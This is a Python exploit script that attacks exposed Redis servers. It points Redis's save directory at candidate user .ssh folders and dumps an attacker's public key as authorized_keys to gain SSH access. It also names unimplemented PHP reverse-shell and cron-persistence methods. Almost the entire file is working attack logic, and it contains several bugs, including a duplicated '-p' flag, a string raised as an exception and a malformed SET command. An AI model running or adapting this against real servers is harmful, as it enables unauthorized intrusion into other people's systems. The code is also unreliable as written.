import argparse
import socket
import subprocess


_bad    = '\033[1;31;40m[-]\033[0m'
_good   = '\033[1;32;40m[+]\033[0m'
_info   = '\033[1;33;40m[~]\033[0m'


def main(args):
    nc = Redis(args.target, args.port)

    with nc as session:
        print(_info, 'Starting Session...')
        if not nc.is_redis_and_vul():
            print(_bad, "This is not redis or we cannot get config")
            raise 'Target is not redis'

        exploit_ssh(session)

    print(_info, 'Session ending... goodbye...')


def exploit_ssh(session):
    """
        Upload public key to authorized file
    """
    print(_info, "Trying SSH...")
    
    is_vulnerable = False

    # Find a home user dir we can dump to
    commands = [
        f'config set dir /var/lib/{session.user}/.ssh',
        f'config set dir /var/{session.user}/.ssh',
        f'config set dir /etc/{session.user}/.ssh',
        f'config set dir /opt/{session.user}/.ssh',
        f'config set dir /home/{session.user}/.ssh'
    ]

    is_vulnerable = check_commands(session, commands)

    # Return shell
    if is_vulnerable:
        subprocess.run(['ssh-keygen', '-f', '$(pwd)/redis_ssh_key'],
                    shell=True, check=True)

        with open('redis_ssh_key.pub', 'r') as stream:
            pub_key = stream.read()

        # Redis throws a lot of junk chars around dumped keys
        # padding with newlines to be safe
        commands = [
            'config set dbfilename authorized_keys',
            f'set My_SSH_Key "\n\n\n{pub_key}\n\n\n""',
            'SAVE'
        ]
        # Dump the key into .ssh folder
        session.send_payload(commands)
    
        #TODO: paramiko to use as ssh client
        print(_good, 'Upload Complete: use redis_ssh_key to SSH')

    else:
        print(_bad, 'Cannot exploit w/ SSH')


def exploit_www(session):
    """
        Upload php reverse shell script, then invoke
    """
    pass


def exploit_cron(session):
    """
        Add cron task to crontab or cron.d
    """
    pass


def check_commands(session: Redis, dir_commands: list) -> bool:
    """ Determine if any commands in list can be ran
    
        :return: True if vulnerable dir found
    """

    for command in dir_commands:
        print(_info, 'Trying dir "{}"'.format(command.split(' ')[-1]))
        result = session.send_payload([command, 'SAVE'])
        if 'OK' in result:
            print(_good, f'Command: "{command}" was successful')
            return True
        else:
            print(_bad, f'Command: "{command}" was unsuccessful')
    print(_info, "All commands were ran")
    return False


class Redis:
    """
        Because Subprocess wasn't that fun of an idea
    """
    def __init__(self, hostname:str, port:int = 6379, username:str = 'redis'):
        """
            :param hostname:    Hostname or IP of target
            :param port:        Port Of Redis Service
            :param username:    Account Redis is running under
        """
        self.hostname = hostname
        self.port = port
        self.user = 'redis'
        self.session = None
        if not self.is_redis_and_vul():
            raise "This Is Not Redis"
        

    def __enter__(self):
        """ Establish socket connection """

        self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.session.connect((self.hostname, self.port))
        return self


    def __exit__(self, exc_type, exc_val, exc_tb):
        """ Cleanup Of Socket """

        self.session.close()


    def is_redis_and_vul(self) -> bool:
        """ Returns true if connection is Redis and we can get config

            Additional vulerability detection must be made in each section,
            to determine if the config can be exploited

            :return: bool
        """

        self.session.send(b'CONFIG GET *\n')
        return True if 'err' not in self.session.recv(1024).decode() else False


    def send_payload(self, payload:list, read_bytes:int=1024):
        """ Send list of commands to objects socket connection """
        # TODO: add buffer if problems arise in reading data, 
        # (i.e slow or to avoid additional noise)
        data = []
        for command in payload:
            self.session.send(command.encode() + b'\n')
            data.append(self.session.recv(read_bytes).decode())
        return data


if __name__ == '__main__':
    #TODO: Add arguments for additional dirs to be added
    parser = argparse.ArgumentParser(description='Get Reverse Shell From Redis')
    parser.add_argument('target', type=str,
                        help='ip/hostname of target')

    parser.add_argument('-p', '--port', type=int, default=6379,
                        dest='port', help='port of redis server')

    parser.add_argument('-u', '--username', type=str, default="root",
                        dest='username', help='suspected name of user running service "Redis"')

    parser.add_argument('-p', '--password', type=str, default="",
                        dest='password', help='suspected password running service "Redis"')

    parser.add_argument('-m', '--methods', type=str, default="all",
                        dest='methods', help='Use specific method to gain access (i.e. ssh, www, cron)')

    """parser.add_argument('-k', '--key', nargs='?', type=argparse.FileType('r'),
                        default=sys.stdin, help='Use an already generated key')"""
    
    args = parser.parse_args()

    
    main(args)

